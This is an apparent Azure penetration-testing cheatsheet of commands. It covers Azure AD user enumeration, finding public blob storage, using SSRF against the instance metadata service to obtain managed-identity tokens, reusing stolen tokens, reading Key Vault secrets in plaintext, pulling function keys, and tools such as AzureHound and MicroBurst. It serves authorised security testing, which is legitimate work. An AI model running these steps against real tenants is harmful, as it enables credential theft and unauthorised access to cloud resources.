# ğŸ”µ Azure Pentesting Cheatsheet

```
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘   
â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ•”â•  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•      â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â•  â•šâ•â•â•â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•    â•šâ•â•     â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•   â•šâ•â•   â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•   â•šâ•â•   
```

---

## ğŸ” Azure AD Enumeration

### Unauthenticated Enumeration
```bash
# Check if domain uses Azure AD
https://login.microsoftonline.com/TARGET.COM/.well-known/openid-configuration
https://login.microsoftonline.com/getuserrealm.srf?login=admin@TARGET.COM

# User enumeration (timing attack)
# Using o365creeper
python o365creeper.py -f emails.txt

# Using AADInternals (PowerShell)
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName target.com
```

### With Valid Credentials
```powershell
# Install Az module
Install-Module Az -Force

# Login
Connect-AzAccount
# or with service principal
$cred = Get-Credential
Connect-AzAccount -Credential $cred -ServicePrincipal -TenantId "TENANT-ID"

# Get current context
Get-AzContext

# List subscriptions
Get-AzSubscription

# List resources
Get-AzResource

# List VMs
Get-AzVM

# List storage accounts
Get-AzStorageAccount
```

### Azure AD Graph
```powershell
# Connect to Azure AD
Connect-AzureAD

# List users
Get-AzureADUser -All $true

# List groups
Get-AzureADGroup -All $true

# List group members
Get-AzureADGroupMember -ObjectId "GROUP-ID"

# List applications
Get-AzureADApplication -All $true

# List service principals
Get-AzureADServicePrincipal -All $true

# Get user roles
Get-AzureADDirectoryRole
Get-AzureADDirectoryRoleMember -ObjectId "ROLE-ID"
```

---

## ğŸª£ Azure Blob Storage

### Enumeration
```bash
# Check for public blobs
https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list

# Common blob names
ffuf -u "https://FUZZ.blob.core.windows.net" -w wordlist.txt -mc 200,400

# Using Azure CLI
az storage blob list --account-name ACCOUNT --container-name CONTAINER --output table

# Download blobs
az storage blob download --account-name ACCOUNT --container-name CONTAINER --name FILE --file local.txt
```

### Anonymous Access Check
```bash
# Check container access level
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container"

# If public - list all blobs
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
```

### Tools
```bash
# MicroBurst
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base target

# BlobHunter
python3 blobhunter.py -s storage_account_name
```

---

## ğŸ“„ Azure IMDS (Metadata)

### SSRF to Metadata
```bash
# Get instance metadata
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get access token
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Token for different resources
resource=https://management.azure.com/           # Azure Resource Manager
resource=https://vault.azure.net                 # Key Vault
resource=https://storage.azure.com/              # Storage
resource=https://graph.microsoft.com/            # MS Graph
```

### Using Stolen Token
```powershell
# Use access token with Az module
$token = "eyJ0eXAi..."
Connect-AzAccount -AccessToken $token -AccountId "user@domain.com"

# Or with REST API
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}
Invoke-RestMethod -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -Headers $headers
```

---

## ğŸ”‘ Azure Key Vault

### Enumeration
```powershell
# List key vaults
Get-AzKeyVault

# Get vault details
Get-AzKeyVault -VaultName "VAULT-NAME"

# List secrets
Get-AzKeyVaultSecret -VaultName "VAULT-NAME"

# Get secret value
Get-AzKeyVaultSecret -VaultName "VAULT-NAME" -Name "SECRET-NAME" -AsPlainText

# List keys
Get-AzKeyVaultKey -VaultName "VAULT-NAME"

# List certificates
Get-AzKeyVaultCertificate -VaultName "VAULT-NAME"
```

---

## âš¡ Azure Functions

### Enumeration
```powershell
# List function apps
Get-AzFunctionApp

# Get function app details
Get-AzFunctionApp -ResourceGroupName "RG" -Name "FUNCTION-APP"

# List functions
az functionapp function list --name FUNCTION-APP --resource-group RG
```

### Get Function Keys (if access)
```bash
# Get host key
az functionapp keys list --name FUNCTION-APP --resource-group RG

# Get function key
az functionapp function keys list --name FUNCTION-APP --resource-group RG --function-name FUNCTION
```

---

## ğŸ› ï¸ Azure Pentesting Tools

### AzureHound (BloodHound for Azure)
```bash
# Collect Azure AD data
./azurehound -u "user@domain.com" -p "password" list --tenant "TENANT-ID" -o output.json

# Import to BloodHound
# Upload output.json to BloodHound GUI
```

### ROADtools
```bash
# Install
pip install roadrecon roadlib

# Authentication
roadrecon auth -u user@domain.com -p password

# Gather data
roadrecon gather

# Start GUI
roadrecon gui
```

### MicroBurst
```powershell
Import-Module MicroBurst.psm1

# Enumerate blobs
Invoke-EnumerateAzureBlobs -Base company

# Enumerate subdomains
Invoke-EnumerateAzureSubDomains -Base company

# REST API recon
Get-AzDomainInfo -domain target.com
```

### PowerZure
```powershell
Import-Module PowerZure.psm1

# Get all info
Get-AzureTargets

# Privilege escalation check
Show-AzureKeyVaultContent
Get-AzureRunAsAccounts
Get-AzureRunbookContent
```

---

## ğŸ“‹ Azure Pentesting Checklist

```markdown
â–¡ Enumerate Azure AD (users, groups, apps)
â–¡ Check for public blob storage
â–¡ Enumerate VMs and networking
â–¡ Check for exposed IMDS
â–¡ Enumerate Key Vault secrets
â–¡ Check Function Apps for secrets
â–¡ Look for automation runbooks
â–¡ Check for service principal credentials
â–¡ Run AzureHound for attack paths
```

---

## ğŸ”— Related Cheatsheets

- [AWS Pentesting](./AWS-Pentesting.md)
- [GCP Pentesting](./GCP-Pentesting.md)
- [AD Attack Methodology](../AD-Attack-Methodology/README.md)

---

**Back to Overview:** [â˜ï¸ Cloud Security](./README.md)
